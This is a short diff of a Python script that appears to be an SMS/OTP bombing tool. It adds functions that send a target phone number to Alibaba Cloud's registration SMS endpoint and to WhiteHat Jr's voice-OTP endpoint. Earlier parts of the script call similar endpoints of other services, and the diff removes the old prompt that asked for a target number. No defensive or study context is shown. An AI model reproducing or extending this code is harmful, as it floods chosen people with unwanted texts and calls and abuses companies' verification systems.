@@ -43,7 +43,19 @@ def rapidapi(phone): #phone = 84943687522
 	response = requests.request("POST", url, data=payload, headers=headers)
 	return(response.text)
 
-phone = input(">_ Phone : ")
-print(rapidapi(phone))
-print(grab(phone))
-print(airbnb(phone))
+
+def alibabacloud(phone): #943687522
+	link = "https://passport.alibabacloud.com/register/checkcode/send_checkcode.do?send_type=sms"
+	data = {"mobile":""}
+	data["mobile"] = phone[1:]
+	res = requests.post(link,data=data)
+	return(res,res.text)
+
+def whitehatjr(phone): # 943687522
+	phone = phone[1:]
+	link = "https://code.whitehatjr.com/api/V1/otp/generate"
+	json = {"dialCode":"+84","mobile":phone,"type":"voice"}
+	res = requests.post(link,json=json)
+	return(res,res.text)
+
+
